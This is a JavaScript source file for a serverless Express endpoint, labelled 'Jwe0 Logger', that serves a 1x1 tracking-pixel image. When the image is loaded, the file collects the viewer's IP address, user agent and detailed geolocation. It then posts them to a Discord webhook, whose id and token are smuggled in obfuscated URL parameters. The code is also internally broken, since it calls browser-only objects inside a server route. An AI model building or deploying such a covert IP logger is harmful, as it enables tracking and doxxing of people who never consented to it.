const express = require('express');
const serverless = require('serverless-http');
const app = express();

function getParams() {
    return Object.fromEntries(new URLSearchParams(window.location.search));
}

function send_data(data) {
    fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(ip_data => {
        const ip = ip_data.ip
        fetch('https://ipapi.co/' + ip + '/json/')
        .then(response => response.json())
        .then(ip_lookup_data => {
            message = {
                embeds: [{
                    title : "Jwe0 Logger",
                    description : "A user has been logged",
                    fields : [
                        {
                            name : "User",
                            value : "```" + data[1] + "```"
                        },
                        {
                            name : "IP",
                            value : "```" + ip + "```"
                        },
                        {
                            name : "UA",
                            value : "```" + navigator.userAgent + "```"
                        },
                        {
                            name : "Location",
                            value : "```" + "Ip: " + ip_lookup_data.ip + "\n" +"Network: " + ip_lookup_data.network + "\n" +"Version: " + ip_lookup_data.version + "\n" +"City: " + ip_lookup_data.city + "\n" +"Region: " + ip_lookup_data.region + "\n" +"Region_Code: " + ip_lookup_data.region_code + "\n" +"Country: " + ip_lookup_data.country + "\n" +"Country_Name: " + ip_lookup_data.country_name + "\n" +"Country_Code: " + ip_lookup_data.country_code + "\n" +"Country_Code_Iso3: " + ip_lookup_data.country_code_iso3 + "\n" +"Country_Capital: " + ip_lookup_data.country_capital + "\n" +"Country_Tld: " + ip_lookup_data.country_tld + "\n" +"Continent_Code: " + ip_lookup_data.continent_code + "\n" +"In_Eu: " + ip_lookup_data.in_eu + "\n" +"Postal: " + ip_lookup_data.postal + "\n" +"Latitude: " + ip_lookup_data.latitude + "\n" +"Longitude: " + ip_lookup_data.longitude + "\n" +"Timezone: " + ip_lookup_data.timezone + "\n" +"Utc_Offset: " + ip_lookup_data.utc_offset + "\n" +"Country_Calling_Code: " + ip_lookup_data.country_calling_code + "\n" +"Currency: " + ip_lookup_data.currency + "\n" +"Currency_Name: " + ip_lookup_data.currency_name + "\n" +"Languages: " + ip_lookup_data.languages + "\n" +"Country_Area: " + ip_lookup_data.country_area + "\n" +"Country_Population: " + ip_lookup_data.country_population + "\n" +"Asn: " + ip_lookup_data.asn + "\n" +"Org: " + ip_lookup_data.org + "\n" +"```"
                        }
                    ]
                }]
            }
            fetch(data[0], {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(message)
            })
            
        })
    })
}


function getvalues(params) {
    const username = params.username;
    const secret  = params.secret;
    secret_values = secret.split(username);

    secretids = secret_values[0];
    secretint = secret_values[1].split("|");

    token = secretids.slice(0, secretint[0])
    id    = secretids.slice(secretint[0])

    const url = "https://discord.com/api/webhooks/" + id + "/" + token

    return [url, username];
}

function run() {
    url_paramaters = getParams();
    values = getvalues(url_paramaters);
    
    send_data(values);
}

app.get('/image', (req, res) => {
    run();
    res.sendFile(__dirname + './Assets/1x1.png');
});


module.exports.handler = serverless(app);